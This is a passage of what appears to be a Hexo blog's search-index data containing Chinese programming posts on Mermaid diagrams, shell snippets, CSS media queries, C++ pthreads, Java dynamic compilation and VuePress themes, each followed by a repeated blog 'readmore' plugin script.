"96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ 开发随笔"},{title:"Hexo NexT 主题渲染 Mermaid 绘图",url:"/posts/e6e0cad5.html",text:'版本说明 Hexo 5.4.0 NexT 8.8.1 NexT 渲染 Mermaid 绘图安装 Hexo 插件在博客的根目录下，执行以下命令安装 hexo-filter-mermaid-diagrams 插件 1$ npm install hexo-filter-mermaid-diagrams --save NexT 启用 Mermaid打开 NexT 主题的 _config.yml 配置文件，找到 mermaid 的配置项，并设置 enable: true，如下所示： 1234567# Mermaid tagmermaid: enable: true # Available themes: default | dark | forest | neutral theme: light: default dark: dark Hexo 重新编译构建执行以下命令，重新执行 Hexo 的编译构建操作，并启动 Hexo-Server 的预览服务，若 Mermaid 的绘图正常显示，则说明 Mermaid 成功被渲染。 1$ hexo clean &amp;&amp; hexo generate &amp;&amp; hexo server Hexo 插件的使用Hexo 插件 hexo-filter-mermaid-diagrams 的官方文档说明可以看这里。 语法说明值得一提的是，有一些 Markdown 的编辑工具，比如在 Cmd Markdown 里，Mermaid 的使用语法是这样的： 但 hexo-filter-mermaid-diagrams 这款插件的使用语法略有不同： sequence、graph TD 等 Mermaid Diagram 的具体类型必须写在第一行的内容里 三个点后面要写的是 mermaid，而不是 sequence、graph TD 等 Mermaid Diagram 的具体类型 使用示例流程图1234567graph TB id1(圆角矩形)--普通线--&gt;id2[矩形]; subgraph 子图 id2==粗线==&gt;id3{菱形} id3-.虚线.-&gt;id4&gt;右向旗帜] id3--无箭头---id5((圆形)) end graph TB id1(圆角矩形)--普通线--&gt;id2[矩形]; subgraph 子图 id2==粗线==&gt;id3{菱形} id3-.虚线.-&gt;id4&gt;右向旗帜] id3--无箭头---id5((圆形)) end 时序图12345678910sequenceDiagramAlice-&gt;&gt;John: Hello John, how are you?loop Healthcheck John-&gt;&gt;John: Fight against hypochondriaendNote right of John: Rational thoughts! John--&gt;&gt;Alice: Great! John-&gt;&gt;Bob : How about you? Bob--&gt;&gt;John : Jolly good! sequenceDiagram Alice-&gt;&gt;John: Hello John, how are you? loop Healthcheck John-&gt;&gt;John: Fight against hypochondria end Note right of John: Rational thoughts! John--&gt;&gt;Alice: Great! John-&gt;&gt;Bob : How about you? Bob--&gt;&gt;John : Jolly good! 甘特图12345678ganttsection Section Completed: done, des1, 2014-01-06, 2014-01-08 Active : active, des2, 2014-01-07, 3d Parallel 1 : des3, after des1, 1d Parallel 2 : des4, after des1, 1d Parallel 3 : des5, after des3, 1d Parallel 4 : des6, after des4, 1d gantt section Section Completed: done, des1, 2014-01-06, 2014-01-08 Active : active, des2, 2014-01-07, 3d Parallel 1 : des3, after des1, 1d Parallel 2 : des4, after des1, 1d Parallel 3 : des5, after des3, 1d Parallel 4 : des6, after des4, 1d 饼图123456pie title Key elements in Product X "Calcium" : 42.96 "Potassium" : 50.05 "Magnesium" : 10.01 "Iron" : 5 pie title Key elements in Product X "Calcium" : 42.96 "Potassium" : 50.05 "Magnesium" : 10.01 "Iron" : 5 类别图123456789101112131415161718192021classDiagram Animal &lt;|-- Duck Animal &lt;|-- Fish Animal &lt;|-- Zebra Animal : +int age Animal : +String gender Animal: +isMammal() Animal: +mate() class Duck{ +String beakColor +swim() +quack() } class Fish{ -int sizeInFeet -canEat() } class Zebra{ +bool is_wild +run() } classDiagram Animal &lt;|-- Duck Animal &lt;|-- Fish Animal &lt;|-- Zebra Animal : +int age Animal : +String gender Animal: +isMammal() Animal: +mate() class Duck{ +String beakColor +swim() +quack() } class Fish{ -int sizeInFeet -canEat() } class Zebra{ +bool is_wild +run() } 状态图12345678910111213141516stateDiagram [*]--&gt;Active state Active { [*]--&gt;NumLockOff NumLockOff--&gt;NumLockOn : EvNumLockPressed NumLockOn--&gt;NumLockOff : EvNumLockPressed -- [*]--&gt;CapsLockOff CapsLockOff--&gt;CapsLockOn : EvCapsLockPressed CapsLockOn--&gt;CapsLockOff : EvCapsLockPressed -- [*]--&gt;ScrollLockOff ScrollLockOff--&gt;ScrollLockOn : EvCapsLockPressed ScrollLockOn--&gt;ScrollLockOff : EvCapsLockPressed } stateDiagram [*]--&gt;Active state Active { [*]--&gt;NumLockOff NumLockOff--&gt;NumLockOn : EvNumLockPressed NumLockOn--&gt;NumLockOff : EvNumLockPressed -- [*]--&gt;CapsLockOff CapsLockOff--&gt;CapsLockOn : EvCapsLockPressed CapsLockOn--&gt;CapsLockOff : EvCapsLockPressed -- [*]--&gt;ScrollLockOff ScrollLockOff--&gt;ScrollLockOn : EvCapsLockPressed ScrollLockOn--&gt;ScrollLockOff : EvCapsLockPressed } 实体关系图1234erDiagram CUSTOMER ||--o{ ORDER : places ORDER ||--|{ LINE-ITEM : contains CUSTOMER }|..|{ DELIVERY-ADDRESS : uses erDiagram CUSTOMER ||--o{ ORDER : places ORDER ||--|{ LINE-ITEM : contains CUSTOMER }|..|{ DELIVERY-ADDRESS : uses 参考资料 mermaid-js 官方文档 hexo-filter-mermaid-diagrams 插件的官方文档 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"静态博客"},{title:"Shell 编程常用代码块之一",url:"/posts/d9ceba01.html",text:'日志定义日志的颜色123456789101112131415161718192021222324252627282930313233#!/bin/bash_COLORS=${BS_COLORS:-$(tput colors 2&gt;/dev/null || echo 0)}__detect_color_support() { if [ $? -eq 0 ] &amp;&amp; [ "$_COLORS" -gt 2 ]; then RC=\'\\033[1;31m\' GC=\'\\033[1;32m\' BC=\'\\033[1;34m\' YC=\'\\033[1;33m\' EC=\'\\033[0m\' else RC="" GC="" BC="" YC="" EC="" fi}__detect_color_supportechoerror() { printf "${RC} * ERROR${EC}: %s\\\\n" "$@" 1&gt;&amp;2;}echoinfo() { printf "${GC} * INFO${EC}: %s\\\\n" "$@";}echowarn() { printf "${YC} * WARN${EC}: %s\\\\n" "$@";}# 使用示例echoinfo "Hello World"echowarn "Hello World"echoerror "Hello World" 常见的条件判断判断目录是否存在123456789#!/bin/bashLOGS_PATH="/tmp/logs/blog"if [ ! -d "$LOGS_PATH" ]; then echo "目录不存在"else echo "目录已存在"fi 判断操作系统类型1234567891011#!/bin/bash_OS_LINUX="Linux"_OS_INFO=`uname -a`if [[ $_OS_INFO =~ $_OS_LINUX ]]then echo "Linux 操作系统"else echo "非 Linux 操作系统"fi 判断是否为 Root 用户12345#!/bin/bashif [ $UID -ne 0 ]; then echo "非 Root 用户!"fi 执行脚本执行指定的 Shell 脚本文件使用 Linux 命令，执行指定的 Shell 脚本文件 1sh date.sh 执行指定的 Shell 脚本内容使用 Linux 命令，执行指定的 Shell 脚本内容 1sh -c "echo 现在的时间：`date \'+%Y-%m-%d %H:%M:%S\'`" 获取 Linux 命令的执行结果1234#!/bin/bashdate_str=$(date)echo $date_str 执行字符串里的 Shell 脚本内容1234#!/bin/bashUPDATE_SYSTEM_DYNAMIC_LIBS=0echo "### 是否更新系统的动态链接库: `[[ $UPDATE_SYSTEM_DYNAMIC_LIBS -eq 1 ]] &amp;&amp; echo \'是\' || echo \'否\'`" 程序运行状态获取应用的进程数12345678#!/bin/bash# 应用的名称program_name="dockerd"# 精确统计应用正在运行的进程数量count=`ps -aux | grep -w "$program_name" | grep -v grep | wc -l`echo $count 获取应用的进程 ID12345678910111213141516#!/bin/bash# 应用的名称program_name="dockerd"# 精确获取应用正在运行的进程ID（应用同时运行了多个实例时，会有多个值，返回数组）process_ids=`ps -aux | grep -w "$program_name" | grep -v grep | awk \'{print $2}\'`# 判断进程ID是否为空if [ ! -n "$process_ids" ]; then echo "$program_name 没有运行"else # 数组转字符串 process_ids_str=`echo $process_ids` echo "$program_name 已经有实例正在运行，PID 是 ${process_ids_str/ /, }" fi 日期处理判断是否为周末1234567#!/bin/bashif [[ $(date +%u) -gt 5 ]]; then echo "今天是周末"else echo "今天不是周末"fi 判断今天是星期几12345#!/bin/bash# 值的范围是1 ~ 7，其中 1 表示星期一DOW=$(date +%u)echo $DOW 文件处理读取 ini 配置文件提示 ini 配置文件的格式介绍，可以参考这里 ini 配置文件的后缀名不一定必须是 .ini，也可以是 .cfg、.conf 或者是 .txt。 config.ini 配置文件的内容 12345[Server1]ip = 127.0.0.1[Server2]ip = 192.168.1.1 example.sh 脚本的内容 1234567891011function __readINI() { INIFILE=$1; SECTION=$2; ITEM=$3 _readContent=`awk -F \'=\' \'/\\[\'$SECTION\'\\]/{a=1}a==1&amp;&amp;$1~/\'$ITEM\'/{print $2;exit}\' $INIFILE` echo ${_readContent}}_IP1=( $( __readINI config.ini Server1 ip ) )_IP2=( $( __readINI config.ini Server2 ip ) )echo ${_IP1}echo ${_IP2} 脚本执行后输出的结果 12127.0.0.1192.168.1.1 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux系统编程 代码块"},{title:"MyBatis 源码分析",url:"/posts/9a55ed5d.html",text:"",tags:"在线电子书"},{title:"C++ 开发知识图谱 (最新)",url:"/posts/87f5b84d.html",text:'C++ 基础知识 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"知识图谱"},{title:"CSS 开发随笔",url:"/posts/7562a9f6.html",text:'移动端适配隐藏或显示页面内容有些页面内容适合在 PC 端显示，但是不适合在移动端显示（比如盒子过大，遮挡内容）或者在移动端显示毫无意义等，此时可以使用下面的 CSS 代码来实现：PC 端显示，移动端隐藏 1234567&lt;body&gt; &lt;div class="wapnone"&gt;移动端要判断隐藏的内容&lt;/div&gt; &lt;div class="tool_cai"&gt;移动端要判断隐藏的内容&lt;/div&gt; &lt;div class="tool_code"&gt;移动端要判断隐藏的内容&lt;/div&gt; &lt;div class="tool_zan"&gt;移动端要判断隐藏的内容&lt;/div&gt; &lt;div id="player"&gt;移动端要判断隐藏的内容&lt;/div&gt;&lt;/body&gt; 1234567891011121314151617181920/* 调用单个class */@media screen and (max-width: 1221px) { .wapnone { display: none; }}/* 调用多个class */@media screen and (max-width: 1221px) { .tool_cai, .tool_code, .tool_zan { display: none; }}/* 调用id */@media screen and (max-width: 1221px) { #player { display: none; }} 提示 1、1221px 是屏幕的宽度，具体数值可以自行调试 2、max-width: 1221px 表示如果屏幕宽度在 1221 像素以下（移动端），则对应的 CSS 类就会生效 3、同理的，min-width: 1221px，表示如果屏幕宽度在 1221 像素以上（PC 端），则对应的 CSS 类就会生效 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端 开发随笔"},{title:"区块链开发知识图谱 (最新)",url:"/posts/d5d6425c.html",text:'区块链开发技术 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"知识图谱"},{title:"Python 开发知识图谱 (最新)",url:"/posts/3c42fe19.html",text:'Python 就业方向 Python 开发技术 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"知识图谱"},{title:"Linux 系统编程之四 C++ 多线程",url:"/posts/841eca80.html",text:'查看 pthread.h 的位置在 Linux 系统里，pthread.h 头文件的位置一般是 /usr/include/pthread.h，可以通过以下命令查看头文件的位置 1# whereis pthread.h 基于 pthread 多线程编程案例代码123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;using namespace std;void printids(const char *s) { pid_t pid = getpid(); pthread_t tid = pthread_self(); printf("%s pid %u tid %u (0x%x)\\n", s, (unsigned int) pid, (unsigned int) tid, (unsigned int) tid);}void *thr_fn(void *args) { printids("new thread: "); return ((void *) 0);}int main() { pthread_t ntid; int err = pthread_create(&amp;ntid, NULL, thr_fn, NULL); if (err != 0) { printf("can\'t create thread: %d\\n", err); exit(1); } printids("main thread: "); sleep(1); return 0;} 编译代码由于 pthread 不是 Linux 系统默认的库，因此链接时需要使用静态库 libpthread.a。简而言之，在使用 pthread_create() 创建线程，以及调用 pthread_atfork() 函数建立 fork 处理程序时，需要通过 -lpthread 参数链接该库，同时还需要在 C++ 源文件里添加头文件 pthread.h。 提示 为了可以正常编译使用了 pthread 的项目代码，不同构建工具的使用说明如下： 若使用 G++ 编译 C++ 项目，则编译命令的示例如下： 12# 编译代码$ g++ main.cpp -o main -lpthread 若使用 CMake 构建 C++ 项目，则 CMakeLists.txt 配置文件的示例内容如下： 123set(CMAKE_CXX_FLAGS "-std=c++11 -lpthread")add_executable(main main.cpp) 程序运行输出的结果如下： 12main thread: pid 6189 tid 342021952 (0x1462d740)new thread: pid 6189 tid 324765440 (0x135b8700) var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ linux系统编程"},{title:"Java 动态编译的实现",url:"/posts/b8943243.html",text:'前言本文主要介绍如何实现 Java 的动态编译，并给出快速入门案例，点击下载完整的案例代码。 快速入门编写接口12345678910package com.clay.domain;/** * @author clay */public interface Store { public void sell();} 12345678910111213package com.clay.domain;/** * @author clay */public class Supermarket implements Store { @Override public void sell() { System.out.println("invoke supermarket sell method"); }} 编写工具类1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586package com.clay.loader;import javax.tools.JavaCompiler;import javax.tools.JavaFileObject;import javax.tools.StandardJavaFileManager;import javax.tools.ToolProvider;import java.io.IOException;import java.net.URL;import java.net.URLClassLoader;import java.util.*;/** * 动态加载器 * * @author clay */public class DynamicLoader { /** * 编译参数 */ private List&lt;String&gt; options = new ArrayList&lt;&gt;(); /** * 添加编译参数 * * @param key * @param value * @throws NullPointerException */ public void addOption(String key, String value) throws NullPointerException { if (key == null || key.isEmpty()) { throw new NullPointerException("Option key is empty"); } options.add(key); options.add(value); } /** * 通过Java文件名和其代码，编译得到字节码，返回类名及其对应类的字节码，封装于Map中， * 值得注意的是，平常类中就编译出来的字节码只有一个类，但是考虑到内部类的情况， 会出现很多个类名及其字节码，所以用Map封装方便 * * @param javaName Java文件名，例如Student.java * @param javaCode Java源码 * @return map */ public Map&lt;String, byte[]&gt; compile(String javaName, String javaCode) { JavaCompiler compiler = ToolProvider.getSystemJavaCompiler(); StandardJavaFileManager stdManager = compiler.getStandardFileManager(null, null, null); try (MemoryJavaFileManager manager = new MemoryJavaFileManager(stdManager)) { JavaFileObject javaFileObject = manager.makeStringSource(javaName, javaCode); JavaCompiler.CompilationTask task = compiler.getTask(null, manager, null, options, null, Arrays.asList(javaFileObject)); if (task.call()) { return manager.getClassBytes(); } } catch (IOException e) { e.printStackTrace(); } return null; } /** * 先根据类名在内存中查找是否已存在该类，若不存在则调用URLClassLoader.defineClass()方法加载该类 * URLClassLoader的具体作用就是将Class文件加载到JVM虚拟机中 */ public static class MemoryClassLoader extends URLClassLoader { private Map&lt;String, byte[]&gt; classBytes = new HashMap&lt;String, byte[]&gt;(); public MemoryClassLoader(Map&lt;String, byte[]&gt; classBytes) { super(new URL[0], MemoryClassLoader.class.getClassLoader()); this.classBytes.putAll(classBytes); } @Override protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException { byte[] buf = this.classBytes.get(name); if (buf == null) { return super.findClass(name); } this.classBytes.remove(name); return defineClass(name, buf, 0, buf.length); } }} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132package com.clay.loader;import javax.tools.*;import java.io.*;import java.net.URI;import java.nio.CharBuffer;import java.util.HashMap;import java.util.Map;/** * 将编译好的Class文件保存到内存当中，这里的内存也就是Map映射当中 * * @author clay */public final class MemoryJavaFileManager extends ForwardingJavaFileManager { /** * 用于存放Class文件的内存 */ private Map&lt;String, byte[]&gt; classBytes; /** * Java源文件的扩展名 */ private final static String EXT = ".java"; public MemoryJavaFileManager(JavaFileManager fileManager) { super(fileManager); classBytes = new HashMap&lt;String, byte[]&gt;(); } public Map&lt;String, byte[]&gt; getClassBytes() { return classBytes; } @Override public void close() throws IOException { classBytes = new HashMap&lt;String, byte[]&gt;(); } @Override public void flush() throws IOException { } @Override public JavaFileObject getJavaFileForOutput( JavaFileManager.Location location, String className, JavaFileObject.Kind kind, FileObject sibling) throws IOException { if (kind == JavaFileObject.Kind.CLASS) { return new ClassOutputBuffer(className); } else { return super.getJavaFileForOutput(location, className, kind, sibling); } } public JavaFileObject makeStringSource(String name, String code) { return new StringInputBuffer(name, code); } public static URI toURI(String name) { File file = new File(name); if (file.exists()) { return file.toURI(); } else { try { final StringBuilder newUri = new StringBuilder(); newUri.append("mfm:///"); newUri.append(name.replace(\'.\', \'/\')); if (name.endsWith(EXT)) { newUri.replace(newUri.length() - EXT.length(), newUri.length(), EXT); } return URI.create(newUri.toString()); } catch (Exception exp) { return URI.create("mfm:///com/sun/script/java/java_source"); } } } /** * 一个文件对象，用来表示从String中获取到的Source，以下内容是按照JDK给出的例子写的 */ private static class StringInputBuffer extends SimpleJavaFileObject { private final String code; /** * @param name 此文件对象表示的编译单元的name * @param code 此文件对象表示的编译单元source的code */ StringInputBuffer(String name, String code) { super(toURI(name), Kind.SOURCE); this.code = code; } @Override public CharBuffer getCharContent(boolean ignoreEncodingErrors) { return CharBuffer.wrap(code); } public Reader openReader() { return new StringReader(code); } } /** * 将Java字节码存储到classBytes映射中的文件对象 */ private class ClassOutputBuffer extends SimpleJavaFileObject { private String name; ClassOutputBuffer(String name) { super(toURI(name), Kind.CLASS); this.name = name; } @Override public OutputStream openOutputStream() { return new FilterOutputStream(new ByteArrayOutputStream()) { @Override public void close() throws IOException { out.close(); ByteArrayOutputStream bos = (ByteArrayOutputStream) out; // 这里可能需要修改 classBytes.put(name, bos.toByteArray()); } }; } }} 编写测试类12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package com.clay.loader;import com.clay.domain.Store;import com.clay.domain.Supermarket;import org.springframework.util.Assert;import java.lang.reflect.Constructor;import java.util.Map;/** * @author clay */public class ProxyUtil { /** * 获取Java代码 * * @return */ public String getJavaCode() { String rt = "\\r\\n"; // 这里定义的Java类代码里，建议首行不要带包名，否则容易出现编译失败的问题 String code = "import com.clay.domain.Store;" + rt + "public class Dealer implements Store" + rt + "{" + rt + "private Store s;" + rt + "public Dealer(Store s)" + rt + " {" + " this.s = s;" + rt + " }" + rt + "@Override" + rt + "public void sell()" + " {" + rt + "System.out.println(\\"invoke dealer sell method\\");" + rt + "s.sell();" + rt + " }" + rt + "}"; return code; } /** * 动态编译 * * @throws Exception */ public void handle() throws Exception { String javaName = "Dealer.java"; // 对Java代码进行编译，并将生成Class文件存放在Map中 DynamicLoader dynamicLoader = new DynamicLoader(); Map&lt;String, byte[]&gt; bytecode = dynamicLoader.compile(javaName, getJavaCode()); // 加载字节码到虚拟机中 DynamicLoader.MemoryClassLoader classLoader = new DynamicLoader.MemoryClassLoader(bytecode); Class&lt;?&gt; clazz = classLoader.loadClass("Dealer"); Assert.notNull(clazz, ""); // 通过反射进行调用 Constructor constructor = clazz.getConstructor(Store.class); Store store = (Store) constructor.newInstance(new Supermarket()); store.sell(); }} 123456789101112131415161718192021222324package com.clay;import com.clay.loader.ProxyUtil;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;/** * @author clay */@SpringBootApplicationpublic class ProxyApplication { public static void main(String[] args) { SpringApplication.run(ProxyApplication.class, args); try { ProxyUtil util = new ProxyUtil(); util.handle(); } catch (Exception e) { e.printStackTrace(); } }} 程序运行结果12invoke dealer sell methodinvoke supermarket sell method 常见问题动态编译时找不到第三方包的类动态编译 Java 文件时，如果这个 Java 文件引用了第三方 Jar 包里的类，那么程序运行在 IDE 工具时，则可以正常动态编译。如果程序单独运行在 Web 容器（例如 Tomcat），又或者是直接通过 java -jar xxx.jar 的命令行方式运行，那么执行动态编译时，往往就会提示找不到第三方 Jar 包里的 Class 或者 Package，导致无法正常编译生成 Class 文件或者字节码。 解决方案： 方法一：将所依赖到的第三方 Jar 文件，复制到 %JAVA_HOME%\\jre\\lib\\ext 目录下，然后再重启 Web 容器（Tomcat）或者应用，此方法不一定兼容所有 JDK 版本，且未经验证是否有效 方法二：执行动态编译时，添加 -classpath 参数来指定第三方 Jar 包的绝对路径，示例代码如下： 12345678String jars = "/root/.m2/repository/com/clay/proxy/1.0.0/proxy-1.0.0.jar";Iterable&lt;String&gt; options = Arrays.asList("-encoding", "UTF-8", "-classpath", jars);JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();StandardJavaFileManager fileMgr = compiler.getStandardFileManager(null, null, null);Iterable units = fileMgr.getJavaFileObjects(fileName);JavaCompiler.CompilationTask task = compiler.getTask(null, fileMgr, null, options, null, units);result = task.call(); SpringBoot 找不到动态编译后的类在 SpringBoot 应用内执行动态编译时，可以正常生成 Class 文件，但往往无法直接通过 URLClassLoader 类加载 Class 文件来实例化 Java 对象，示例代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106package com.clay.loader;import javax.tools.JavaCompiler;import javax.tools.JavaCompiler.CompilationTask;import javax.tools.StandardJavaFileManager;import javax.tools.ToolProvider;import java.io.File;import java.io.FileWriter;import java.io.IOException;import java.lang.reflect.Constructor;import java.net.URL;import java.net.URLClassLoader;public class ProxyUtil { /** * 生成文件 * * @param path * @return content */ public boolean createFile(String path, String content) { FileWriter fw = null; try { String parentPath = path.substring(0, path.lastIndexOf("/")); File parentFile = new File(parentPath); if (!parentFile.exists()) { parentFile.mkdirs(); } File javaFile = new File(path); if (!javaFile.exists()) { javaFile.createNewFile(); } fw = new FileWriter(javaFile); fw.write(content); fw.flush(); return true; } catch (Exception e) { e.printStackTrace(); } finally { if (fw != null) { try { fw.close(); } catch (IOException e) { e.printStackTrace(); } } } return false; } /** * 动态编译 * * @throws Exception */ public void handle() throws Exception { String rt = "\\r\\n"; String outputDir = "/tmp/jdk/compile/"; // 这里定义的Java类代码里，建议首行不要带包名，否则容易出现编译失败的问题 String source = "import com.clay.domain.Store;" + rt + "public class Dealer implements Store" + rt + "{" + rt + "private Store s;" + rt + "public Dealer(Store s)" + rt + " {" + " this.s = s;" + rt + " }" + rt + "@Override" + rt + "public void sell()" + " {" + rt + "System.out.println(\\"call dealer sell method\\");" + rt + "s.sell();" + rt + " }" + rt + "}"; // Java文件的完整路径 String javaPath = outputDir + "Dealer.java"; System.out.println("===&gt; java file path: " + javaPath); // 生成Java文件 createFile(javaPath, source); // 编译Java文件 JavaCompiler compiler = ToolProvider.getSystemJavaCompiler(); StandardJavaFileManager fileMgr = compiler.getStandardFileManager(null, null, null); Iterable units = fileMgr.getJavaFileObjects(javaPath); CompilationTask task = compiler.getTask(null, fileMgr, null, null, null, units); boolean result = task.call(); fileMgr.close(); System.out.println("===&gt; compile result: " + result); String classPath = "file:/" + outputDir; System.out.println("===&gt; class file path: " + classPath); // 加载Class文件 URL[] urls = new URL[]{new URL(classPath)}; URLClassLoader ul = new URLClassLoader(urls); Class clazz = ul.loadClass("Dealer"); // 实例化 Constructor ctr = clazz.getConstructor(Store.class); Store s = (Store) ctr.newInstance(new Supermarket()); s.sell(); }} 特别注意：在 SpringBoot 应用内无法正常运行上述代码，即调用 loadClass () 方法的时候会抛出异常 “java.lang.ClassNotFoundException: Dealer” 此时可以尝试使用 Thread.currentThread().getContextClassLoader() 来替代 new URLClassLoader(urls)，具体的实现代码可参考开源项目 dynamic-loader，这里不再累述 开源项目 varcode dynamic-java-compiler dynamic-loader（推荐） 参考博客 动态代理 - 动态生成 Java 文件并编译成 Class 文件 Java 引入 import 其它目录的自定义包或 Java 源文件 将 Java 字符串形式的源代码动态编译，生成 Class 文件并执行 Java 动态编译整个项目，解决 Jar 包找不到的问题 Java Web 项目部署后，动态编译无法找到依赖的 Jar 包 Java Web 项目部署到 Tomcat 后，使用动态编译无法找到相关类的解决方案 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"VuePress 入门教程之三主题篇",url:"/posts/cf4f7150.html",text:"前言版本说明本文的内容是基于 VuePress 1.x 讲解的，一切内容以 官方文档 为准。 教程大纲 VuePress 入门教程之一 - 基础篇 VuePress 入门教程之二 - Markdown 篇 VuePress 入门教程之三 - 主题篇 VuePress 入门教程之四 - 插件篇 使用主题使用一个主题和使用一个插件的方式几乎一致。 使用来自依赖的主题一个主题可以在以 vuepress-theme-xxx 的形式发布到 NPM，你可以这样使用它： 1234// .vuepress/config.jsmodule.exports = { theme: 'vuepress-theme-xx'} 主题的缩写如果你的主题名以 vuepress-theme- 开头，你可以使用缩写来省略这个前缀： 1234// .vuepress/config.jsmodule.exports = { theme: 'xxx'} 和下面等价： 1234// .vuepress/config.jsmodule.exports = { theme: 'vuepress-theme-xxx'} 这也适用于 Scoped Packages: 1234// .vuepress/config.jsmodule.exports = { theme: '@org/vuepress-theme-xxx', // 或者一个官方主题: 